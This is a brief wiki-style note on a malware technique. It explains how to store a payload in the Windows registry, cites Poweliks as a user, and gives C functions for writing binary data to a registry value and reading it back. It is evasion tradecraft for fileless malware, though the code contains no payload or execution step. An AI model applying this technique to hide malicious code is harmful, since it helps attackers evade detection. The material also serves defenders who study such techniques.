---
tags:
  - windows
  - malware
  - security
  - c
---
A payload storage technique that involves storing payload code in the registry.
Seen in:
- [[Poweliks]]
# Pattern
### Writing
- [[RegOpenKeyExA()]]
- [[RegSetValueExA()]]
- [[RegCloseKey()]]
### Reading
- [[RegGetValueA()]]
- [[HeapAlloc()]]
- [[RegGetValueA()]]
# Code
### Writing
```c
// I/O registry key to read/write
#define     REG_SUBKEY_PATH     "Control Panel"
#define     REG_VALUE_NAME      "MyrawValue"

// Function that writes the payload to the registry key
BOOL WriteToRegKeyA(IN HKEY hKey, IN LPCSTR lpcSubKey, IN LPCSTR lpcRegName, IN PBYTE pRegData, IN DWORD dwDataSize) 
{
	HKEY		hkResult		= NULL;
	BOOL		bResult			= FALSE;
	LSTATUS		STATUS			= 0x00;
 
    // Opening handle to "REG_SUBKEY_PATH" registry key
	if ((STATUS = RegOpenKeyExA(hKey, lpcSubKey, 0x00, KEY_WRITE, &hkResult)) != ERROR_SUCCESS) {
		printf("[!] RegOpenKeyExA Failed With Error: 0x%0.8X\n", STATUS);
		return FALSE;
	}
 
    // Creating string value "REG_VALUE_NAME" and writing the payload to it as a binary value
	if ((STATUS = RegSetValueExA(hkResult, lpcRegName, 0x00, REG_BINARY, pRegData, dwDataSize)) != ERROR_SUCCESS) {
		printf("[!] RegSetValueExA Failed With Error: 0x%0.8X\n", STATUS);
        goto _END_OF_FUNC;
	}
 
	bResult = TRUE;
 
_END_OF_FUNC:
	if (hkResult)
		RegCloseKey(hkResult);
	return bResult;
}
```
### Reading
```c
// Function that reads the payload from the registry key 
BOOL ReadFromRegKeyA(IN HKEY hKey, IN LPCSTR lpcSubKey, IN LPCSTR lpcRegName, OUT PBYTE* ppRegData, OUT PDWORD pdwDataSize) 
{
	LSTATUS		STATUS			= 0x00;
	DWORD		dwDataSize		= 0x00;
	PBYTE		pRegData		= NULL;
 
    // Fetching the payload's size
	if ((STATUS = RegGetValueA(hKey, lpcSubKey, lpcRegName, RRF_RT_ANY, NULL, NULL, &dwDataSize)) != ERROR_SUCCESS) {
		printf("[!] RegGetValueA [%d] Failed With Error: 0x%0.8X\n", __LINE__, STATUS);
		return FALSE;
	}
 
	if (!(pRegData = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDataSize))) {
		printf("[!] HeapAlloc Failed With Error: %d\n", GetLastError());
		return FALSE;
	}
 
	if ((STATUS = RegGetValueA(hKey, lpcSubKey, lpcRegName, RRF_RT_ANY, NULL, pRegData, &dwDataSize)) != ERROR_SUCCESS) {
		printf("[!] RegGetValueA [%d] Failed With Error: 0x%0.8X\n", __LINE__, STATUS);
		return FALSE;
	}
 
	*pdwDataSize	= dwDataSize;
	*ppRegData		= pRegData;
 
	return (*pdwDataSize && *ppRegData) ? TRUE : FALSE;
}
```